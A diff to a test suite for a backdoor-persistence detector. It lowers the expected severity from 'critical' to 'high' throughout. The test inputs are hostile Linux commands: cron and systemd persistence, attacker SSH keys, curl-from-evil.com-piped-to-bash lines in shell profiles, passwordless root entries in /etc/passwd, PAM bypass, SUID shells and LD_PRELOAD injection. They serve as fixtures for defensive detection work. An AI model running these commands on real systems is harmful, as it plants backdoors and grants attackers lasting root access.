@@ -6,7 +6,7 @@ describe('detectBackdoorPersistence', () => {
     it('should detect crontab -e', async () => {
       const result = await detectBackdoorPersistence({ command: 'crontab -e' });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.detector).toBe('backdoor-persistence');
       expect(result?.message).toContain('Cron job');
     });
@@ -14,7 +14,7 @@ describe('detectBackdoorPersistence', () => {
     it('should detect crontab with file argument', async () => {
       const result = await detectBackdoorPersistence({ command: 'crontab /tmp/malicious-cron' });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect echo to /etc/cron.d/', async () => {
@@ -22,7 +22,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "* * * * * root /tmp/backdoor.sh" >> /etc/cron.d/malicious',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to /var/spool/cron/', async () => {
@@ -30,7 +30,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "* * * * * /tmp/evil.sh" > /var/spool/cron/root',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to cron.daily', async () => {
@@ -38,7 +38,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat backdoor.sh > /etc/cron.daily/update',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should allow reading crontab', async () => {
@@ -58,7 +58,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'systemctl enable malicious.service',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Systemd');
     });
 
@@ -67,7 +67,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'systemctl daemon-reload && systemctl enable backdoor.service',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to /etc/systemd/system/', async () => {
@@ -75,7 +75,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "[Service]" > /etc/systemd/system/evil.service',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect cat to systemd directory', async () => {
@@ -83,7 +83,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat backdoor.service > /lib/systemd/system/backdoor.service',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should allow systemctl status', async () => {
@@ -107,11 +107,10 @@ describe('detectBackdoorPersistence', () => {
   describe('SSH key manipulation', () => {
     it('should detect echo to authorized_keys', async () => {
       const result = await detectBackdoorPersistence({
-        command:
-          'echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com" >> ~/.ssh/authorized_keys',
+        command: 'echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com" >> ~/.ssh/authorized_keys',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('SSH key');
     });
 
@@ -120,7 +119,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat attacker_key.pub >> /home/user/.ssh/authorized_keys',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect tee to authorized_keys', async () => {
@@ -128,7 +127,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "ssh-rsa ..." | tee -a ~/.ssh/authorized_keys',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect ssh-copy-id', async () => {
@@ -136,7 +135,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'ssh-copy-id -i ~/.ssh/attacker_key.pub user@target',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to .ssh directory', async () => {
@@ -144,7 +143,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "malicious config" > ~/.ssh/config',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should allow reading authorized_keys', async () => {
@@ -168,7 +167,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "curl http://evil.com/backdoor.sh | bash" >> ~/.bashrc',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Shell profile');
     });
 
@@ -177,7 +176,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "export PATH=/tmp:$PATH" >> ~/.bash_profile',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect echo to .zshrc', async () => {
@@ -185,7 +184,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "source /tmp/malicious.sh" >> ~/.zshrc',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect echo to .profile', async () => {
@@ -193,7 +192,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "eval $(curl http://evil.com/payload)" >> ~/.profile',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect tee to .bashrc', async () => {
@@ -201,7 +200,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "malicious code" | tee -a ~/.bashrc',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect echo to /etc/profile', async () => {
@@ -209,7 +208,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "source /tmp/backdoor" >> /etc/profile',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should allow reading .bashrc', async () => {
@@ -229,7 +228,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "/tmp/backdoor.sh &" >> /etc/rc.local',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Startup script');
     });
 
@@ -238,7 +237,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "#!/bin/bash" > /etc/init.d/malicious',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to autostart directory', async () => {
@@ -246,7 +245,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat backdoor.desktop > ~/.config/autostart/backdoor.desktop',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to XDG autostart', async () => {
@@ -254,7 +253,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "[Desktop Entry]" > /etc/xdg/autostart/evil.desktop',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect overwriting rc.local', async () => {
@@ -262,7 +261,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat malicious_script > /etc/rc.local',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
@@ -272,7 +271,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'chmod u+s /tmp/backdoor',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('SUID');
     });
 
@@ -281,13 +280,13 @@ describe('detectBackdoorPersistence', () => {
         command: 'chmod 4755 /usr/local/bin/backdoor',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect chmod +s on shell', async () => {
       const result = await detectBackdoorPersistence({ command: 'chmod +s /bin/bash' });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect SUID on system binary', async () => {
@@ -295,7 +294,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'chmod u+s /usr/bin/malicious',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect numeric SUID (6755)', async () => {
@@ -303,7 +302,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'chmod 6755 /tmp/evil',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
@@ -313,7 +312,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'export LD_PRELOAD=/tmp/malicious.so',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('LD_PRELOAD');
     });
 
@@ -322,7 +321,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'LD_PRELOAD=/tmp/evil.so ./target_program',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to /etc/ld.so.preload', async () => {
@@ -330,7 +329,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "/tmp/malicious.so" >> /etc/ld.so.preload',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect cat to ld.so.preload', async () => {
@@ -338,7 +337,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat malicious.conf > /etc/ld.so.preload',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect export LD_LIBRARY_PATH', async () => {
@@ -346,7 +345,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'export LD_LIBRARY_PATH=/tmp/malicious_libs:$LD_LIBRARY_PATH',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
@@ -356,7 +355,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "attacker::0:0:root:/root:/bin/bash" >> /etc/passwd',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Login system');
     });
 
@@ -365,7 +364,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cat malicious_passwd >> /etc/passwd',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect sed on /etc/passwd', async () => {
@@ -373,7 +372,7 @@ describe('detectBackdoorPersistence', () => {
         command: "sed -i 's/user:x:/user::/g' /etc/passwd",
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect echo to /etc/shadow', async () => {
@@ -381,7 +380,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "attacker:$6$salt$hash::::::::" >> /etc/shadow',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to PAM config', async () => {
@@ -389,7 +388,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "auth sufficient pam_permit.so" > /etc/pam.d/sshd',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect tee to /etc/passwd', async () => {
@@ -397,7 +396,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "backdoor:x:0:0::/tmp:/bin/sh" | tee -a /etc/passwd',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
@@ -407,7 +406,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cp -r malicious_extension ~/.config/google-chrome/Default/Extensions/abcdef',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Browser extension');
     });
 
@@ -416,7 +415,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'google-chrome --load-extension=/tmp/malicious_extension',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect writing to Firefox extensions', async () => {
@@ -424,7 +423,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'cp backdoor.xpi ~/.mozilla/firefox/profile/extensions/',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect chromium --load-extension', async () => {
@@ -432,7 +431,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'chromium --load-extension=/tmp/evil_extension',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
@@ -442,7 +441,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "/tmp/backdoor.sh" | at now + 1 hour',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
       expect(result?.message).toContain('Scheduled job');
     });
 
@@ -451,7 +450,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'at tomorrow <<EOF\n/tmp/evil.sh\nEOF',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect at -f', async () => {
@@ -459,7 +458,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'at -f /tmp/malicious_script.sh now + 10 minutes',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect batch command', async () => {
@@ -467,7 +466,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'echo "/tmp/backdoor" | batch',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect batch -f', async () => {
@@ -475,7 +474,7 @@ describe('detectBackdoorPersistence', () => {
         command: 'batch -f /tmp/evil.sh',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should allow listing at jobs', async () => {
@@ -496,7 +495,7 @@ describe('detectBackdoorPersistence', () => {
           'echo "* * * * * /tmp/backdoor.sh" >> /etc/cron.d/update && chmod +x /tmp/backdoor.sh',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect chained systemd setup', async () => {
@@ -505,7 +504,7 @@ describe('detectBackdoorPersistence', () => {
           'cat backdoor.service > /etc/systemd/system/backdoor.service && systemctl daemon-reload && systemctl enable backdoor.service',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
 
     it('should detect SSH key with profile modification', async () => {
@@ -514,7 +513,7 @@ describe('detectBackdoorPersistence', () => {
           'echo "ssh-rsa AAAAB..." >> ~/.ssh/authorized_keys && echo "cd /tmp && ./backdoor" >> ~/.bashrc',
       });
       expect(result).not.toBeNull();
-      expect(result?.severity).toBe('critical');
+      expect(result?.severity).toBe('high');
     });
   });
 
